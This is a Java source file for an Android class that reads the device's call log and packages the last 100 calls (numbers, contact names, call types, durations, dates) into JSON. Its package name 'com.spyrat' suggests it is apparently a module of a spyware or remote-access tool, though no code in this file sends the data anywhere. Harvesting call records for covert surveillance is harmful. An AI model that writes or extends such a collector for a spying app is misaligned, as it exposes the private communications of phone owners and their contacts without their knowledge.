package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.Date;

public class RealCallLogCollector {
    private static final String TAG = "RealCallLogCollector";
    private Context context;
    
    public RealCallLogCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getCallLogs() {
        JSONArray callLogs = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📞 Collecting REAL call logs from device...");
            
            String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                CallLog.Calls.CACHED_NAME
            };
            
            cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 100"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    
                    // Only process calls with real numbers
                    if (number != null && !number.trim().isEmpty()) {
                        JSONObject call = new JSONObject();
                        call.put("number", number.trim());
                        call.put("name", name != null ? name.trim() : "Unknown");
                        call.put("type", getCallType(type));
                        call.put("duration", duration);
                        call.put("timestamp", date);
                        call.put("readable_date", new Date(date).toString());
                        call.put("duration_minutes", String.format("%d:%02d", duration / 60, duration % 60));
                        
                        callLogs.put(call);
                        count++;
                        
                        if (count <= 5) {
                            Log.d(TAG, "📞 REAL Call: " + number + " - " + getCallType(type) + " - " + duration + "s");
                        }
                    }
                    
                } while (cursor.moveToNext());
                
                Log.d(TAG, "✅ Collected " + count + " REAL call logs from device");
            } else {
                Log.w(TAG, "📭 No REAL call logs found in device");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Call log permission denied - NO CALL LOGS DATA COLLECTED: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading REAL call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return callLogs;
    }
    
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            case CallLog.Calls.VOICEMAIL_TYPE: return "voicemail";
            case CallLog.Calls.REJECTED_TYPE: return "rejected";
            case CallLog.Calls.BLOCKED_TYPE: return "blocked";
            default: return "unknown";
        }
    }
}
